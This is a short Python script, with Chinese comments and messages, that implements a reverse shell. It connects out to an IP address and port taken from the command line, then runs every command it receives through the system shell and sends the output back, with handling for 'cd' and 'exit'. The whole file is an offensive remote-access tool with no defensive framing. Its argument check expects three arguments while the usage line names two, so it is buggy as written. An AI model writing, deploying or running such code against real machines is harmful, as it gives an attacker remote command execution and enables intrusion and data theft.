import socket
import subprocess
import os
import sys

# ---------------- shell 1 ----------------
def shell_1(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.send(f"[+] Shell 1 连接成功!\n\n{os.getcwd()}>".encode('utf-8'))
        while True:
            data = s.recv(1024)
            if not data:
                break
            cmd = data.decode('utf-8', errors='ignore').strip()
            if cmd.lower() == 'exit':
                break
            if cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:].strip())
                    output = ""
                except Exception as e:
                    output = f"切换目录失败: {e}"
            else:
                output = subprocess.getoutput(cmd)
            s.send((output + f"\n\n{os.getcwd()}>").encode('utf-8'))
    except Exception as e:
        try:
            s.send(f"[!] Shell 1 error: {e}\n".encode())
        except:
            pass
    finally:
        s.close()


# -------------- 主入口 --------------
if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("用法: python 1.py <IP> <端口>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    shell_1(ip, port)
